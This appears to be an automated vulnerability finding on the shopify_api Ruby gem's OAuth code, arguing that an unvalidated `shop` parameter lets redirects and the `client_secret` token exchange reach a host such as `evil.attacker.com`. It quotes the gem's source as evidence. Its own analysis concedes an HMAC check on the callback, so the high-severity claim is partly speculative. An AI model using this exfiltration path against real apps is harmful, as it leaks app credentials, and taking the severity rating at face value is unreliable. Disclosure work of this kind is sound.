Confirmed: this gem has no shop-domain allow-list anywhere in `lib/shopify_api/**` (no `myshopify` format check, no `sanitize_shop_domain`-style helper). The `shop` string flows unchecked from caller input into `auth_base_uri` in both the redirect-building and token-exchange paths.

### Title
Unvalidated `shop` parameter allows the app's `client_id`/`client_secret` to be sent to an attacker-controlled host during OAuth token exchange - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` both build the OAuth base URI directly from the caller-supplied `shop` string via `auth_base_uri(shop)`, with no format validation (e.g., no check that it matches `*.myshopify.com`). [1](#0-0) 

### Finding Description
`begin_auth` accepts a `shop:` argument and interpolates it directly into `auth_base_uri(shop) + "/oauth/authorize?..."` with no validation of the domain format. [2](#0-1) 
More critically, `validate_auth_callback` takes `auth_query.shop` (populated from the OAuth callback query string) and uses it to build the base path for the access-token exchange HTTP client, which POSTs the app's `client_id` and `client_secret` (`Context.api_secret_key`) to `"#{auth_base_uri(shop)}/oauth/access_token"`. [3](#0-2) 
The only integrity check on `auth_query.shop` is the HMAC over the query string, which does bind `shop` to the value Shopify originally signed — but the gem provides no defense-in-depth check that `shop` is actually a valid `*.myshopify.com` (or configured) domain before either (a) redirecting the user's browser to it in `begin_auth`, or (b) sending `client_secret` to it as `auth_base_uri` in `validate_auth_callback`. `auth_base_uri` is the single method with intended authority to decide which host receives OAuth traffic (`host that receives the access token or client_secret` versus `host validated`), and it performs no validation at all — it only special-cases a `.my.shop.dev` dev-server suffix. [1](#0-0) 

### Impact Explanation
If `shop` is attacker-influenced at either step (a common integration pattern, since `begin_auth` is typically invoked with a `shop` query parameter or header taken directly from the initial unauthenticated login request, as shown in this library's own documentation example: `shop = request.headers["Shop"]`), the app can be induced to POST `client_id` + `client_secret` to a non-Shopify host, resulting in credential leakage of the app's `client_secret` (SSRF carrying the app's credentials) — matching the High-impact "SSRF with the app's credentials" category. [4](#0-3) 

### Likelihood Explanation
Exploiting the `validate_auth_callback` path additionally requires a valid HMAC, which is computed by Shopify and covers `shop`, so an attacker cannot arbitrarily rewrite `shop` on the callback in isolation. [5](#0-4) [6](#0-5) 
However, `begin_auth` has no such protection: it is invoked before any HMAC exists, using whatever `shop` value the calling application passes in (per this gem's own documented usage, taken straight from an inbound request header/param), so the redirect target — and, if the host app is misconfigured/naively wired to also drive `validate_auth_callback`'s effective shop — is fully attacker-influenced with no library-level check.

### Recommendation
Add a shop-domain format validator (e.g., enforce `*.myshopify.com` / a configurable allow-listed suffix, similar to what other Shopify API client libraries provide) inside `auth_base_uri`, and raise before constructing any URI or sending the OAuth token-exchange request if the `shop` value fails validation.

### Proof of Concept
1. A host application wires `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")` per the documented pattern (`shop = request.headers["Shop"]`).
2. Attacker requests `login?shop=evil.attacker.com`.
3. `auth_base_uri("evil.attacker.com")` returns `"https://evil.attacker.com/admin"` with no validation, and the user's browser is redirected there. [7](#0-6) 
4. If the attacker can also engineer a callback whose `shop` resolves to their host with a valid HMAC (e.g., a compromised/naive host-app wiring that reuses the unvalidated `shop`), `validate_auth_callback` will POST `client_id`/`client_secret`/`code` to `https://evil.attacker.com/admin/oauth/access_token`, exfiltrating the app's `client_secret`. [8](#0-7)

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L22-52)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L73-94)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** docs/usage/oauth.md (L181-185)
```markdown
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```
